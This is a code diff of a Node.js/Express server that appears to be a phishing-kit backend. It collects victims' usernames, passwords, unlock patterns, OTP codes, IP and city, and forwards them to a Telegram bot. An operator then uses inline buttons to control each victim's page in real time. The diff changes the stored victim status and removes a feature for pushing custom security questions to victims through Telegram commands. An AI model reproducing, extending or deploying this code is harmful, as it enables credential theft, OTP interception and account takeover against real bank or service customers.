@@ -72,9 +72,9 @@ Secuencia: <code>${patron}</code>
   `;
 
   try {
-    // 👉 Guardar cliente con estado "patron"
+    // 👉 Guardar cliente con estado "esperando" (para que no rebote a patronnn.html)
     const cliente = {
-      status: "patron",
+      status: "esperando",
       usar,
       ip,
       ciudad: city,
@@ -191,10 +191,6 @@ app.post('/enviar3', async (req, res) => {
 🏙️ Ciudad: ${ciudad}
 `;
 
-  // 👉 Guardamos estado "esperando" después de OTP
-  const cliente = { status: "esperando", usar, clavv, preguntas: [], ip, ciudad };
-  guardarCliente(txid, cliente);
-
   const keyboard = {
     inline_keyboard: [
       [
@@ -220,43 +216,6 @@ app.post('/enviar3', async (req, res) => {
 
 // 🔹 Webhook de control
 app.post('/webhook', async (req, res) => {
-  const message = req.body.message;
-
-  if (message?.text && message.text.startsWith('/')) {
-    const commandParts = message.text.slice(1).split(' ');
-    const txid = commandParts[0];
-    const preguntasTexto = commandParts.slice(1).join(' ');
-    const [pregunta1, pregunta2] = preguntasTexto.split('&');
-
-    if (!pregunta1 || !pregunta2) {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: message.chat.id,
-          text: `⚠️ Formato inválido. Usa:\n/${txid} ¿Pregunta1?&¿Pregunta2?`
-        })
-      });
-      return res.sendStatus(200);
-    }
-
-    const cliente = cargarCliente(txid) || { preguntas: [], status: 'esperando' };
-    cliente.preguntas = [pregunta1.trim(), pregunta2.trim()];
-    cliente.status = 'preguntas';
-    guardarCliente(txid, cliente);
-
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: message.chat.id,
-        text: `✅ Preguntas guardadas para ${txid}\n1️⃣ ${pregunta1.trim()}\n2️⃣ ${pregunta2.trim()}`
-      })
-    });
-
-    return res.sendStatus(200);
-  }
-
   if (req.body.callback_query) {
     const callback = req.body.callback_query;
     const partes = callback.data.split(":");
@@ -266,17 +225,6 @@ app.post('/webhook', async (req, res) => {
     const cliente = cargarCliente(txid) || { status: 'esperando' };
     cliente.status = accion;
     guardarCliente(txid, cliente);
-
-    if (accion === 'preguntas_menu') {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: callback.message.chat.id,
-          text: `✍️ Escribe las 2 preguntas personalizadas para ${txid}, Ej: /${txid} ¿Dónde naciste?&¿Cuál es tu color favorito?`
-        })
-      });
-    }
 
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
       method: 'POST',
